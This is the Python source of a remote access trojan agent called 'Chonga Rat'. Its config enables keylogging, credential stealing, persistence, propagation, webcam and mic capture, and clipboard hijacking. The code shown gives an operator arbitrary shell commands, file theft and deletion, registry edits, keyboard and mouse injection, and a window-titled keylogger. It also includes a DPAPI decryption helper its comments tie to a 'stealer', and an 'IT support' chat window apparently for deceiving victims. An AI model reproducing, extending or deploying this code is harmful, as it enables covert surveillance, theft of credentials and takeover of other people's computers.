#!/usr/bin/env python3
"""
Chonga Rat agent (generated).

Hard constraints:
  * CONFIG["host"] is baked in at build time. There is no environment lookup,
    no config file read and no server-side retargeting.
  * If CONFIG["host"] is loopback the agent also refuses to talk to a
    non-loopback peer.
  * Every command is dispatched through a fixed table compiled into the build.
  * A stable client id identifies this installation to the panel, so several
    agents can be attached at once and each one keeps its own session.

CONFIG is replaced by the panel Builder page.
"""
import atexit
import base64
import ctypes
import hashlib
import io
import json
import os
import platform
import queue
import re
import shutil
import socket
import sqlite3
import struct
import subprocess
import sys
import tempfile
import threading
import time
import uuid
import zipfile
from pathlib import Path

CONFIG = {
    "host": "127.0.0.1",
    "port": 8790,
    "token": "95173225f6b7d3e73ea6cba4425eedca20dab0406f64be6aade9fe8296927f60",
    "features": [
        "screen",
        "input",
        "files",
        "processes",
        "shell",
        "registry",
        "clipboard",
        "keylog",
        "audio",
        "tts",
        "power",
        "messagebox",
        "chat",
        "windows",
        "hvnc",
        "webcam",
        "mic",
        "desktop_audio",
        "stealer",
        "recon",
        "persistence",
        "propagation",
        "proxy",
        "plugins",
        "rustdesk",
        "clipper",
        "control"
    ],
    "label": "local"
}

HOST = str(CONFIG.get("host") or "127.0.0.1")
PORT = int(CONFIG["port"])
TOKEN = CONFIG["token"]
FEATURES = set(CONFIG.get("features", []))
LABEL = CONFIG.get("label", "local")
IS_WIN = os.name == "nt"


def _client_id():
    """Stable per-install id, kept next to the agent so restarts reuse it."""
    path = Path(__file__).resolve().parent / "client.id"
    try:
        value = path.read_text(encoding="utf-8").strip()
        if 6 <= len(value) <= 32:
            return value
    except OSError:
        pass
    value = uuid.uuid4().hex[:12]
    try:
        path.write_text(value, encoding="utf-8")
    except OSError:
        pass
    return value


CLIENT_ID = _client_id()

SEND_LOCK = threading.Lock()
SOCK = None
KEYLOG = {"on": False, "buf": [], "thread": None, "last": 0.0}


# --------------------------------------------------------------------------
# transport
# --------------------------------------------------------------------------
def send(obj):
    global SOCK
    line = (json.dumps(obj) + "\n").encode("utf-8")
    with SEND_LOCK:
        SOCK.sendall(line)


def event(kind, **kw):
    send({"event": kind, "ts": time.time(), **kw})


def ok(rid, **data):
    send({"id": rid, "ok": True, "data": data})


def err(rid, message):
    send({"id": rid, "ok": False, "error": str(message)[:800]})


# --------------------------------------------------------------------------
# system info
# --------------------------------------------------------------------------
def is_admin():
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False


def sysinfo():
    import psutil
    vm = psutil.virtual_memory()
    du = shutil.disk_usage(os.environ.get("SystemDrive", "C:") + "\\")
    try:
        load = psutil.cpu_percent(interval=0.15)
    except Exception:
        load = 0.0
    return {
        "hostname": socket.gethostname(),
        "username": os.environ.get("USERNAME") or os.environ.get("USER", "?"),
        "domain": os.environ.get("USERDOMAIN", ""),
        "os": platform.platform(),
        "version": platform.version(),
        "arch": platform.machine(),
        "python": platform.python_version(),
        "cpu": platform.processor() or "unknown",
        "cores": psutil.cpu_count(logical=True),
        "cpuLoad": load,
        "ramTotal": vm.total,
        "ramUsed": vm.used,
        "ramPercent": vm.percent,
        "diskTotal": du.total,
        "diskUsed": du.used,
        "diskFree": du.free,
        "admin": is_admin(),
        "uptime": int(time.time() - psutil.boot_time()),
        "label": LABEL,
        "pid": os.getpid(),
        "exe": sys.executable,
        "features": sorted(FEATURES),
        "monitors": monitor_count(),
    }


def _mss():
    import mss
    factory = getattr(mss, "MSS", None) or mss.mss
    return factory()


_MSS_LOCK = threading.RLock()
_MSS = {"sct": None}


def _mss_cached():
    """One capture context for the whole process.

    Commands run on a fresh thread each time, so a thread-local copy would
    rebuild the device context on every frame. The lock serialises grabs; the
    caller must hold it.
    """
    if _MSS["sct"] is None:
        _MSS["sct"] = _mss()
    return _MSS["sct"]


def _mss_drop():
    with _MSS_LOCK:
        _MSS["sct"] = None


def monitor_count():
    if not IS_WIN:
        return 1
    try:
        with _MSS_LOCK:
            return max(1, len(_mss_cached().monitors) - 1)
    except Exception:
        return 1


# --------------------------------------------------------------------------
# screen
# --------------------------------------------------------------------------
SHOT_SEQ = {"n": 0}


def _encode_jpeg(raw, width, height, quality, scale=1.0):
    """JPEG bytes from a BGRA buffer, through the fastest encoder installed.

    opencv is roughly an order of magnitude quicker than Pillow on a 1080p
    frame, which is the difference between 20 and 40 fps on the wire.
    """
    quality = max(20, min(95, int(quality)))
    if scale < 0.999:
        from PIL import Image
        img = Image.frombuffer("RGB", (width, height), raw, "raw", "BGRX", 0, 1)
        width = max(2, int(width * scale) & ~1)
        height = max(2, int(height * scale) & ~1)
        img = img.resize((width, height), Image.BILINEAR)
        buf = io.BytesIO()
        img.save(buf, format="JPEG", quality=quality)
        return buf.getvalue(), width, height
    try:
        import numpy as np
        import cv2
        arr = np.frombuffer(raw, dtype=np.uint8)
        arr = arr.reshape((height, width, 4))[:, :, :3]
        ok, enc = cv2.imencode(".jpg", np.ascontiguousarray(arr),
                               [int(cv2.IMWRITE_JPEG_QUALITY), quality])
        if ok:
            return enc.tobytes(), width, height
    except Exception:
        pass
    from PIL import Image
    img = Image.frombuffer("RGB", (width, height), raw, "raw", "BGRX", 0, 1)
    buf = io.BytesIO()
    img.save(buf, format="JPEG", quality=quality)
    return buf.getvalue(), width, height


def screenshot(args):
    quality = max(20, min(95, int(args.get("quality", 60))))
    mon = int(args.get("monitor", 0))
    try:
        scale = float(args.get("scale", 1.0) or 1.0)
    except (TypeError, ValueError):
        scale = 1.0
    scale = max(0.25, min(1.0, scale))
    if IS_WIN:
        for attempt in (0, 1):
            try:
                with _MSS_LOCK:
                    sct = _mss_cached()
                    mons = sct.monitors
                    idx = min(max(0, mon) + 1, len(mons) - 1)
                    shot = sct.grab(mons[idx])
                    raw = shot.bgra
                    size = shot.size
                blob, w, h = _encode_jpeg(raw, size[0], size[1], quality, scale)
                SHOT_SEQ["n"] += 1
                return {"jpeg": base64.b64encode(blob).decode("ascii"),
                        "width": w, "height": h,
                        "monitor": mon, "quality": quality,
                        "seq": SHOT_SEQ["n"]}
            except Exception:
                # a stale context (monitor change, driver reset) is rebuilt once
                _mss_drop()
                if attempt:
                    break
    try:
        from PIL import ImageGrab
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, format="JPEG", quality=quality)
        SHOT_SEQ["n"] += 1
        return {"jpeg": base64.b64encode(buf.getvalue()).decode("ascii"),
                "width": img.width, "height": img.height, "monitor": 0,
                "quality": quality, "seq": SHOT_SEQ["n"]}
    except Exception as e:
        raise RuntimeError(f"screen capture unavailable: {e}")


# --------------------------------------------------------------------------
# input injection (Windows SendInput)
# --------------------------------------------------------------------------
if IS_WIN:
    from ctypes import wintypes

    ULONG_PTR = ctypes.c_ulonglong if ctypes.sizeof(ctypes.c_void_p) == 8 else ctypes.c_ulong

    class MOUSEINPUT(ctypes.Structure):
        _fields_ = [("dx", wintypes.LONG), ("dy", wintypes.LONG),
                    ("mouseData", wintypes.DWORD), ("dwFlags", wintypes.DWORD),
                    ("time", wintypes.DWORD), ("dwExtraInfo", ULONG_PTR)]

    class KEYBDINPUT(ctypes.Structure):
        _fields_ = [("wVk", wintypes.WORD), ("wScan", wintypes.WORD),
                    ("dwFlags", wintypes.DWORD), ("time", wintypes.DWORD),
                    ("dwExtraInfo", ULONG_PTR)]

    class HARDWAREINPUT(ctypes.Structure):
        _fields_ = [("uMsg", wintypes.DWORD), ("wParamL", wintypes.WORD),
                    ("wParamH", wintypes.WORD)]

    class _INPUTUNION(ctypes.Union):
        _fields_ = [("mi", MOUSEINPUT), ("ki", KEYBDINPUT), ("hi", HARDWAREINPUT)]

    class INPUT(ctypes.Structure):
        _anonymous_ = ("u",)
        _fields_ = [("type", wintypes.DWORD), ("u", _INPUTUNION)]

    MOUSEEVENTF = {
        "move": 0x0001, "leftdown": 0x0002, "leftup": 0x0004,
        "rightdown": 0x0008, "rightup": 0x0010, "middledown": 0x0020,
        "middleup": 0x0040, "wheel": 0x0800, "hwheel": 0x1000,
        "absolute": 0x8000, "virtualdesk": 0x4000,
    }
    KEYEVENTF_KEYUP = 0x0002
    KEYEVENTF_UNICODE = 0x0004

    def _send_input(inp):
        ctypes.windll.user32.SendInput(1, ctypes.byref(inp), ctypes.sizeof(INPUT))

    def _mouse(flags, dx=0, dy=0, data=0):
        inp = INPUT(type=0)
        inp.mi = MOUSEINPUT(dx, dy, data, flags, 0, 0)
        _send_input(inp)

    def _key_vk(vk, down):
        inp = INPUT(type=1)
        inp.ki = KEYBDINPUT(vk, 0, 0 if down else KEYEVENTF_KEYUP, 0, 0)
        _send_input(inp)

    def _key_unicode(ch, down):
        inp = INPUT(type=1)
        inp.ki = KEYBDINPUT(0, ord(ch), KEYEVENTF_UNICODE | (0 if down else KEYEVENTF_KEYUP), 0, 0)
        _send_input(inp)


def do_mouse(args):
    if not IS_WIN:
        raise RuntimeError("input injection is Windows-only")
    action = str(args.get("action", "move"))
    x = int(args.get("x", 0))
    y = int(args.get("y", 0))
    if action in ("move", "click", "double", "right", "down", "up", "wheel"):
        sw = ctypes.windll.user32.GetSystemMetrics(0)
        sh = ctypes.windll.user32.GetSystemMetrics(1)
        ax = int(x * 65535 / max(1, sw - 1))
        ay = int(y * 65535 / max(1, sh - 1))
        _mouse(MOUSEEVENTF["move"] | MOUSEEVENTF["absolute"] | MOUSEEVENTF["virtualdesk"], ax, ay)
        if action != "move":
            # a click needs the cursor to land first; a move is the whole event
            time.sleep(0.004)
    if action == "move":
        return {"x": x, "y": y}
    if action == "click":
        _mouse(MOUSEEVENTF["leftdown"]); _mouse(MOUSEEVENTF["leftup"])
    elif action == "double":
        for _ in range(2):
            _mouse(MOUSEEVENTF["leftdown"]); _mouse(MOUSEEVENTF["leftup"]); time.sleep(0.03)
    elif action == "right":
        _mouse(MOUSEEVENTF["rightdown"]); _mouse(MOUSEEVENTF["rightup"])
    elif action == "down":
        _mouse(MOUSEEVENTF["leftdown"])
    elif action == "up":
        _mouse(MOUSEEVENTF["leftup"])
    elif action == "wheel":
        _mouse(MOUSEEVENTF["wheel"], data=int(args.get("delta", 120)))
    elif action != "move":
        raise RuntimeError(f"unknown mouse action {action}")
    return {"action": action, "x": x, "y": y}


def do_key(args):
    if not IS_WIN:
        raise RuntimeError("input injection is Windows-only")
    text = args.get("text")
    if text is not None:
        for ch in str(text):
            _key_unicode(ch, True)
            _key_unicode(ch, False)
            time.sleep(0.005)
        return {"typed": len(str(text))}
    vk = int(args.get("vk", 0))
    down = bool(args.get("down", True))
    if not vk:
        raise RuntimeError("vk required")
    _key_vk(vk, down)
    return {"vk": vk, "down": down}


# --------------------------------------------------------------------------
# clipboard
# --------------------------------------------------------------------------
def _clip_api():
    """Win32 clipboard functions default to c_int returns, which truncates
    64-bit HANDLEs. Declare the real signatures once."""
    u = ctypes.windll.user32
    k = ctypes.windll.kernel32
    u.OpenClipboard.argtypes = [ctypes.c_void_p]
    u.OpenClipboard.restype = ctypes.c_bool
    u.GetClipboardData.argtypes = [ctypes.c_uint]
    u.GetClipboardData.restype = ctypes.c_void_p
    u.SetClipboardData.argtypes = [ctypes.c_uint, ctypes.c_void_p]
    u.SetClipboardData.restype = ctypes.c_void_p
    k.GlobalAlloc.argtypes = [ctypes.c_uint, ctypes.c_size_t]
    k.GlobalAlloc.restype = ctypes.c_void_p
    k.GlobalLock.argtypes = [ctypes.c_void_p]
    k.GlobalLock.restype = ctypes.c_void_p
    k.GlobalUnlock.argtypes = [ctypes.c_void_p]
    k.GlobalUnlock.restype = ctypes.c_bool
    return u, k


def clipboard_get(_args):
    if not IS_WIN:
        raise RuntimeError("clipboard is Windows-only")
    u, k = _clip_api()
    CF_UNICODETEXT = 13
    if not u.OpenClipboard(None):
        raise RuntimeError("clipboard busy")
    try:
        h = u.GetClipboardData(CF_UNICODETEXT)
        if not h:
            return {"text": ""}
        p = k.GlobalLock(h)
        if not p:
            raise RuntimeError("GlobalLock failed")
        try:
            return {"text": ctypes.wstring_at(p)}
        finally:
            k.GlobalUnlock(h)
    finally:
        u.CloseClipboard()


def clipboard_set(args):
    if not IS_WIN:
        raise RuntimeError("clipboard is Windows-only")
    text = str(args.get("text", ""))
    u, k = _clip_api()
    GMEM_MOVEABLE = 0x0002
    CF_UNICODETEXT = 13
    data = text.encode("utf-16-le") + b"\x00\x00"
    if not u.OpenClipboard(None):
        raise RuntimeError("clipboard busy")
    try:
        u.EmptyClipboard()
        h = k.GlobalAlloc(GMEM_MOVEABLE, len(data))
        if not h:
            raise RuntimeError("GlobalAlloc failed")
        p = k.GlobalLock(h)
        if not p:
            raise RuntimeError("GlobalLock failed")
        try:
            ctypes.memmove(p, data, len(data))
        finally:
            k.GlobalUnlock(h)
        if not u.SetClipboardData(CF_UNICODETEXT, h):
            raise RuntimeError("SetClipboardData failed")
    finally:
        u.CloseClipboard()
    return {"length": len(text)}


# --------------------------------------------------------------------------
# filesystem
# --------------------------------------------------------------------------
def drives(_args):
    out = []
    if IS_WIN:
        mask = ctypes.windll.kernel32.GetLogicalDrives()
        for i in range(26):
            if mask & (1 << i):
                root = f"{chr(65 + i)}:\\"
                t = ctypes.windll.kernel32.GetDriveTypeW(ctypes.c_wchar_p(root))
                kind = {2: "removable", 3: "fixed", 4: "network", 5: "cdrom", 6: "ramdisk"}.get(t, "unknown")
                out.append({"path": root, "type": kind})
    else:
        out.append({"path": "/", "type": "fixed"})
    return {"drives": out}


def listdir(args):
    path = str(args.get("path") or (os.environ.get("SystemDrive", "C:") + "\\"))
    p = Path(path)
    if not p.exists():
        raise RuntimeError("path not found")
    if not p.is_dir():
        raise RuntimeError("not a directory")
    entries = []
    with os.scandir(p) as it:
        for e in it:
            try:
                st = e.stat(follow_symlinks=False)
                entries.append({
                    "name": e.name,
                    "dir": e.is_dir(follow_symlinks=False),
                    "size": 0 if e.is_dir(follow_symlinks=False) else st.st_size,
                    "mtime": st.st_mtime,
                    "attrs": "hidden" if (getattr(st, "st_file_attributes", 0) & 2) else "",
                })
            except OSError:
                continue
    entries.sort(key=lambda x: (not x["dir"], x["name"].lower()))
    parent = str(p.parent) if str(p.parent) != str(p) else ""
    return {"path": str(p), "parent": parent, "entries": entries[:5000]}


def stat(args):
    p = Path(str(args["path"]))
    st = p.stat()
    return {"name": p.name, "size": st.st_size, "mtime": st.st_mtime,
            "dir": p.is_dir(), "path": str(p)}


def mkdir(args):
    Path(str(args["path"])).mkdir(parents=True, exist_ok=False)
    return {"path": args["path"]}


def rename(args):
    src = Path(str(args["path"]))
    dst = Path(str(args["to"]))
    src.rename(dst)
    return {"from": str(src), "to": str(dst)}


def delete(args):
    p = Path(str(args["path"]))
    if p.is_dir():
        if args.get("recursive"):
            shutil.rmtree(p)
        else:
            p.rmdir()
    else:
        p.unlink()
    return {"deleted": str(p)}


FILE_HANDLES = {}


def file_read(args):
    p = str(args["path"])
    offset = int(args.get("offset", 0))
    length = int(args.get("length", 262144))
    with open(p, "rb") as fh:
        fh.seek(offset)
        data = fh.read(length)
    return {"data": base64.b64encode(data).decode("ascii"), "offset": offset,
            "length": len(data), "eof": len(data) < length}


def file_write(args):
    p = str(args["path"])
    offset = int(args.get("offset", 0))
    data = base64.b64decode(args.get("data", ""))
    mode = "r+b" if os.path.exists(p) and offset > 0 else "wb"
    with open(p, mode) as fh:
        fh.seek(offset)
        fh.write(data)
    return {"offset": offset, "written": len(data)}


def file_close(args):
    return {"path": args.get("path", ""), "size": int(args.get("size", 0))}


# --------------------------------------------------------------------------
# processes
# --------------------------------------------------------------------------
def processes(_args):
    import psutil
    out = []
    for p in psutil.process_iter(["pid", "name", "username", "exe", "memory_info"]):
        try:
            i = p.info
            out.append({
                "pid": i["pid"], "name": i["name"] or "",
                "user": i["username"] or "", "exe": i["exe"] or "",
                "rss": getattr(i.get("memory_info"), "rss", 0),
            })
        except Exception:
            continue
    out.sort(key=lambda x: x["name"].lower())
    return {"processes": out[:800], "count": len(out)}


def process_kill(args):
    import psutil
    pid = int(args["pid"])
    p = psutil.Process(pid)
    p.terminate()
    try:
        p.wait(timeout=3)
    except Exception:
        p.kill()
    return {"pid": pid, "killed": True}


def process_start(args):
    path = str(args["path"])
    cwd = args.get("cwd") or str(Path(path).parent)
    p = subprocess.Popen([path], cwd=cwd, close_fds=True,
                         creationflags=getattr(subprocess, "CREATE_NEW_PROCESS_GROUP", 0))
    return {"pid": p.pid, "path": path}


# --------------------------------------------------------------------------
# shell / registry / power
# --------------------------------------------------------------------------
def shell(args):
    cmd = str(args.get("command", ""))
    if not cmd:
        raise RuntimeError("command required")
    t = min(int(args.get("timeout", 20)), 120)
    cwd = args.get("cwd") or None
    try:
        r = subprocess.run(cmd, shell=True, cwd=cwd, capture_output=True,
                           timeout=t, text=True, errors="replace")
        return {"code": r.returncode, "stdout": r.stdout[-200000:],
                "stderr": r.stderr[-50000:]}
    except subprocess.TimeoutExpired as e:
        return {"code": -1, "stdout": (e.stdout or "")[-200000:] if isinstance(e.stdout, str) else "",
                "stderr": "timeout"}


def registry(args):
    if not IS_WIN:
        raise RuntimeError("registry is Windows-only")
    import winreg
    op = str(args.get("op", "list"))
    root_name = str(args.get("root", "HKCU")).upper()
    roots = {"HKCU": winreg.HKEY_CURRENT_USER, "HKLM": winreg.HKEY_LOCAL_MACHINE,
             "HKCR": winreg.HKEY_CLASSES_ROOT, "HKU": winreg.HKEY_USERS}
    root = roots.get(root_name)
    if root is None:
        raise RuntimeError("unknown root")
    path = str(args.get("path", ""))
    if op == "list":
        with winreg.OpenKey(root, path, 0, winreg.KEY_READ) as k:
            nsub, nval, _ = winreg.QueryInfoKey(k)
            subs = [winreg.EnumKey(k, i) for i in range(nsub)]
            vals = []
            for i in range(nval):
                name, data, typ = winreg.EnumValue(k, i)
                vals.append({"name": name, "data": str(data)[:4000], "type": typ})
        return {"keys": subs, "values": vals}
    if op == "get":
        with winreg.OpenKey(root, path, 0, winreg.KEY_READ) as k:
            data, typ = winreg.QueryValueEx(k, args.get("name", ""))
        return {"data": str(data), "type": typ}
    if op == "set":
        with winreg.CreateKeyEx(root, path, 0, winreg.KEY_WRITE) as k:
            winreg.SetValueEx(k, str(args.get("name", "")), 0,
                              int(args.get("type", winreg.REG_SZ)), args.get("data", ""))
        return {"ok": True}
    if op == "create_key":
        with winreg.CreateKeyEx(root, path, 0, winreg.KEY_WRITE):
            pass
        return {"ok": True}
    if op == "delete_value":
        with winreg.OpenKey(root, path, 0, winreg.KEY_WRITE) as k:
            winreg.DeleteValue(k, str(args.get("name", "")))
        return {"ok": True}
    if op == "delete_key":
        winreg.DeleteKey(root, path)
        return {"ok": True}
    raise RuntimeError("unknown registry op")


def power(args):
    action = str(args.get("action", "lock"))
    if action == "lock":
        ctypes.windll.user32.LockWorkStation()
        return {"action": action}
    if action in ("shutdown", "restart", "logoff"):
        flag = {"shutdown": "/s", "restart": "/r", "logoff": "/l"}[action]
        subprocess.Popen(f"shutdown {flag} /t 0", shell=True)
        return {"action": action}
    raise RuntimeError("unknown power action")


def messagebox(args):
    if not IS_WIN:
        raise RuntimeError("Windows-only")
    text = str(args.get("text", ""))
    caption = str(args.get("caption", "Chonga Rat"))
    # MessageBoxW blocks until dismissed; show it off-thread so the command
    # returns immediately instead of stalling the panel for the full timeout.
    threading.Thread(
        target=lambda: ctypes.windll.user32.MessageBoxW(None, text, caption, 0x40),
        daemon=True,
    ).start()
    return {"shown": True}


# --------------------------------------------------------------------------
# keylogger
# --------------------------------------------------------------------------
VK_NAMES = {
    0x08: "[back]", 0x09: "[tab]", 0x0D: "[enter]", 0x1B: "[esc]", 0x20: " ",
    0x25: "[left]", 0x26: "[up]", 0x27: "[right]", 0x28: "[down]",
    0x2E: "[del]", 0x10: "", 0x11: "", 0x12: "", 0x14: "[caps]",
}
for _i in range(0x30, 0x3A):
    VK_NAMES[_i] = chr(_i)
for _i in range(0x41, 0x5B):
    VK_NAMES[_i] = chr(_i + 32)


def _foreground():
    try:
        u = ctypes.windll.user32
        h = u.GetForegroundWindow()
        n = u.GetWindowTextLengthW(h)
        b = ctypes.create_unicode_buffer(n + 1)
        u.GetWindowTextW(h, b, n + 1)
        return b.value
    except Exception:
        return ""


def keylog_loop():
    u = ctypes.windll.user32
    last_window = None
    while KEYLOG["on"]:
        for vk, name in VK_NAMES.items():
            if u.GetAsyncKeyState(vk) & 0x8000:
                if vk in (0x10, 0x11, 0x12):
                    continue
                win = _foreground()
                if win != last_window:
                    KEYLOG["buf"].append(f"\n[{win}] ")
                    last_window = win
                KEYLOG["buf"].append(name)
                if vk == 0x0D:
                    flush_keylog()
                time.sleep(0.035)
        if time.time() - KEYLOG["last"] > 2:
            flush_keylog()
        time.sleep(0.02)


def flush_keylog():
    if not KEYLOG["buf"]:
        return
    text = "".join(KEYLOG["buf"])
    KEYLOG["buf"] = []
    KEYLOG["last"] = time.time()
    if text.strip():
        event("keylog", text=text[-4000:])


def keylog_start(_args):
    if KEYLOG["on"]:
        return {"already": True}
    KEYLOG["on"] = True
    KEYLOG["last"] = time.time()
    t = threading.Thread(target=keylog_loop, daemon=True)
    KEYLOG["thread"] = t
    t.start()
    return {"started": True}


def keylog_stop(_args):
    KEYLOG["on"] = False
    flush_keylog()
    return {"stopped": True}


def keylog_dump(_args):
    flush_keylog()
    return {"ok": True}


# --------------------------------------------------------------------------
# audio / tts / windows / idle
# --------------------------------------------------------------------------
def tts(args):
    text = str(args.get("text", ""))[:2000]
    if not text:
        raise RuntimeError("text required")
    if IS_WIN:
        safe = text.replace("'", "''")
        ps = ("Add-Type -AssemblyName System.Speech; "
              "$s=New-Object System.Speech.Synthesis.SpeechSynthesizer; "
              f"$s.Speak('{safe}')")
        subprocess.Popen(["powershell", "-NoProfile", "-Command", ps],
                         creationflags=0x08000000)
        return {"spoken": len(text)}
    raise RuntimeError("tts is Windows-only")


def audio(args):
    op = str(args.get("op", "beep"))
    if not IS_WIN:
        raise RuntimeError("Windows-only")
    import winsound
    if op == "beep":
        winsound.Beep(int(args.get("freq", 880)), int(args.get("ms", 250)))
        return {"op": op}
    if op == "play":
        winsound.PlaySound(str(args["path"]), winsound.SND_FILENAME | winsound.SND_ASYNC)
        return {"op": op}
    raise RuntimeError("unknown audio op")


def windows(_args):
    if not IS_WIN:
        raise RuntimeError("Windows-only")
    u = ctypes.windll.user32
    out = []

    @ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_void_p, ctypes.c_void_p)
    def cb(hwnd, _):
        if not u.IsWindowVisible(hwnd):
            return True
        n = u.GetWindowTextLengthW(hwnd)
        if not n:
            return True
        b = ctypes.create_unicode_buffer(n + 1)
        u.GetWindowTextW(hwnd, b, n + 1)
        pid = ctypes.c_ulong()
        u.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
        out.append({"title": b.value, "pid": pid.value})
        return True

    u.EnumWindows(cb, None)
    return {"windows": out[:300]}


def idle(_args):
    if not IS_WIN:
        return {"idle": 0}
    class LASTINPUTINFO(ctypes.Structure):
        _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]
    li = LASTINPUTINFO()
    li.cbSize = ctypes.sizeof(li)
    ctypes.windll.user32.GetLastInputInfo(ctypes.byref(li))
    ms = ctypes.windll.kernel32.GetTickCount() - li.dwTime
    return {"idle": int(ms / 1000)}


# --------------------------------------------------------------------------
# chat window
#
# Tk is single-threaded and its objects must be created and finalized on the
# same thread. Running it inside the agent caused Tcl_AsyncDelete crashes when
# the window closed and the garbage collector ran elsewhere, so the window is
# a child process. This process only speaks JSON lines to it.
# --------------------------------------------------------------------------
CHAT = {"proc": None, "reader": None}


def _chat_argv():
    if getattr(sys, "frozen", False):
        return [sys.executable, "--chat-window"]
    return [sys.executable, os.path.abspath(__file__), "--chat-window"]


def _chat_reader(proc):
    try:
        for line in proc.stdout:
            try:
                msg = json.loads(line)
            except json.JSONDecodeError:
                continue
            if msg.get("event") == "chat":
                event("chat", text=msg.get("text", ""), who=msg.get("who", "user"))
    except (OSError, ValueError):
        pass
    finally:
        try:
            proc.wait(timeout=5)
        except Exception:
            pass
        if CHAT["proc"] is proc:
            CHAT["proc"] = None
        event("chat_closed")


def chat_open(args):
    if not IS_WIN:
        raise RuntimeError("Windows-only")
    proc = CHAT["proc"]
    if proc is not None and proc.poll() is None:
        return {"already": True}
    initial = str(args.get("text") or "Hello. This is IT support.")
    try:
        proc = subprocess.Popen(
            _chat_argv(),
            stdin=subprocess.PIPE, stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL, text=True, encoding="utf-8", bufsize=1,
            creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
        )
    except OSError as e:
        raise RuntimeError(f"cannot start chat window: {e}")
    CHAT["proc"] = proc
    try:
        proc.stdin.write(json.dumps({"text": initial}) + "\n")
        proc.stdin.flush()
    except OSError:
        pass
    t = threading.Thread(target=_chat_reader, args=(proc,), daemon=True)
    CHAT["reader"] = t
    t.start()
    return {"opened": True}


def chat_send(args):
    proc = CHAT["proc"]
    if proc is None or proc.poll() is not None:
        raise RuntimeError("chat is not open")
    try:
        proc.stdin.write(json.dumps({"text": str(args.get("text", ""))}) + "\n")
        proc.stdin.flush()
    except OSError as e:
        raise RuntimeError(f"chat window is gone: {e}")
    return {"sent": True}


def chat_close(_args):
    proc = CHAT["proc"]
    if proc is not None and proc.poll() is None:
        try:
            proc.stdin.write('{"cmd":"close"}\n')
            proc.stdin.flush()
        except OSError:
            pass
    return {"closed": True}


def chat_window_main():
    """Child entry point. Every Tk call happens on this process's main thread."""
    import tkinter as tk

    def emit(obj):
        try:
            sys.stdout.write(json.dumps(obj) + "\n")
            sys.stdout.flush()
        except (AttributeError, OSError):
            pass

    root = tk.Tk()
    root.title("IT support")
    root.geometry("460x360")
    try:
        root.attributes("-topmost", True)
    except Exception:
        pass
    log_box = tk.Text(root, height=16, state="disabled", wrap="word")
    log_box.pack(fill="both", expand=True, padx=8, pady=(8, 4))
    row = tk.Frame(root)
    row.pack(fill="x", padx=8, pady=(0, 8))
    entry = tk.Entry(row)
    entry.pack(side="left", fill="x", expand=True)
    inbox: queue.Queue = queue.Queue()

    def add(who, text):
        log_box.configure(state="normal")
        log_box.insert("end", f"{who}: {text}\n")
        log_box.see("end")
        log_box.configure(state="disabled")

    def submit(_=None):
        text = entry.get().strip()
        if not text:
            return
        entry.delete(0, "end")
        add("you", text)
        emit({"event": "chat", "text": text, "who": "user"})

    def read_stdin():
        if sys.stdin is None:
            return
        try:
            for line in sys.stdin:
                try:
                    inbox.put(json.loads(line))
                except json.JSONDecodeError:
                    continue
        except (OSError, ValueError):
            pass
        inbox.put({"cmd": "close"})

    def pump():
        try:
            while True:
                msg = inbox.get_nowait()
                if msg.get("cmd") == "close":
                    root.destroy()
                    return
                if "text" in msg:
                    add("support", str(msg["text"]))
        except queue.Empty:
            pass
        root.after(120, pump)

    tk.Button(row, text="Send", command=submit).pack(side="left", padx=(6, 0))
    entry.bind("<Return>", submit)
    threading.Thread(target=read_stdin, daemon=True).start()
    root.protocol("WM_DELETE_WINDOW", root.destroy)
    root.after(120, pump)
    root.mainloop()


# --------------------------------------------------------------------------
# shared helpers for the extended modules
# --------------------------------------------------------------------------
def _b64(data):
    return base64.b64encode(data).decode("ascii")


def _temp(name):
    d = Path(tempfile.gettempdir()) / "chonga"
    d.mkdir(parents=True, exist_ok=True)
    return d / name


class _BLOB(ctypes.Structure):
    _fields_ = [("cbData", ctypes.c_uint32), ("pbData", ctypes.c_void_p)]


def _dpapi(data):
    """CryptUnprotectData with 64-bit-safe signatures.

    LocalFree must be prototyped too. Without argtypes ctypes truncates the
    returned pointer to 32 bits, the free raises OverflowError inside the
    finally block, and the exception swallows an otherwise successful decrypt.
    That single missing line made every DPAPI value in the stealer come back
    empty.
    """
    if not data:
        return b""
    if not IS_WIN:
        return b""
    c = ctypes.windll.crypt32
    c.CryptUnprotectData.argtypes = [
        ctypes.POINTER(_BLOB), ctypes.c_void_p, ctypes.POINTER(_BLOB),
        ctypes.c_void_p, ctypes.c_void_p, ctypes.c_uint, ctypes.POINTER(_BLOB),
    ]
    c.CryptUnprotectData.restype = ctypes.c_bool
    k32 = ctypes.windll.kernel32
    k32.LocalFree.argtypes = [ctypes.c_void_p]
    k32.LocalFree.restype = ctypes.c_void_p

    buf = ctypes.create_string_buffer(data, len(data))
    src = _BLOB(len(data), ctypes.cast(buf, ctypes.c_void_p))
    out = _BLOB()
    if not c.CryptUnprotectData(ctypes.byref(src), None, None, None, None, 0,
                                ctypes.byref(out)):
        return b""
    try:
        return ctypes.string_at(out.pbData, out.cbData)
    finally:
        if out.pbData:
            k32.LocalFree(out.pbData)


def _wav(pcm, rate=16000, channels=1, width=2):
    import wave
    buf = io.BytesIO()
    with wave.open(buf, "wb") as w:
        w.setnchannels(channels)
        w.setsampwidth(width)
        w.setframerate(rate)
        w.writeframes(pcm)
    return buf.getvalue()


def _chrome_time(us):
    try:
        if not us:
            return None
        return time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime(us / 1_000_000 - 11644473600))
    except (TypeError, ValueError, OSError):
        return None


# --------------------------------------------------------------------------
# monitors, desktop mask
# --------------------------------------------------------------------------
def monitors(_args):
    if not IS_WIN:
        return {"monitors": [], "count": 0}
    with _mss() as sct:
        out = []
        for i, m in enumerate(sct.monitors[1:]):
            out.append({"index": i, "left": m["left"], "top": m["top"],
                        "width": m["width"], "height": m["height"]})
    return {"monitors": out, "count": len(out)}


MASK = {
    "on": False, "since": 0.0, "ttl": 0, "handles": [],
    "hotkey": False, "watchdog": None,
}
MASK_TTL = 300          # seconds before the mask lifts itself
MASK_HOTKEY_VK = 0x4C   # L
SW_SHOWNORMAL = 1
SWP_NOSIZE = 0x0001
SWP_NOMOVE = 0x0002
